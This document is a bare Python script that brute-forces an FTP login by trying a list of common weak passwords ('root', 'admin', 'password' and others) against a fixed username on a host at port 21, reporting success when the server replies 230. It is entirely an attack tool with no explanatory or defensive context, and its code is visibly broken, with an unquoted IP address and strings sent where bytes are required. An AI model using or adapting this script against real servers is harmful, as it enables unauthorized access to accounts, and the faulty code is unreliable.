import socket

import re

import sys

def connect(username,password):
    sample = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(username + password)
    sample.connect((192.168.1.105, 21))
    data = sample.recv(1024)
    sample.send('USER ' + username + '\r\n')
    data = sample.recv(1024)
    sample.send('PASS ' + password + '\r\n')
    data = sample.recv(3)
    sample.send('QUIT  \r\n')
    sample.close()
    return data

username = "SampleName"
passwords = ["123", "ftp", "root", "admin", "test", "backup", "password"]
for password in passwords:
              attempt = connect(username, password)
              if attempt == "230":
                print("[*] password found: " + password)

sys.exit(0)